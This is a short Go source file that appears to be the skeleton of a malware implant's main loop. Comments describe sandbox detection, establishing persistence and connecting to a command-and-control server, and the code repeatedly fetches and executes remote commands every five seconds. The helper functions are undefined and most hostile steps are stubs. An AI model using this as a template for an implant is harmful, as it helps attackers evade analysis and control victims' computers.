package main

import (
	"fmt"
	"time"
)

func main() {
	fmt.Println("Starting the application...")

	// detect sandbox

	// load configuration file (config.json)
	// configurations := loadConfig(true)

	// establish persistence
	// if persistence is already established, do nothing
	// else, establish persistence

	// if IsPersistent() == false {
	// 	Persistence()
	// }

	// connect to C2 server and wait for commands
	for {
		fmt.Println("Get command")

		commandToRun := getCommand()

		commandRunner(commandToRun)

		time.Sleep(time.Second * time.Duration(5 /*configurations.PullingRate*/))

	}

}
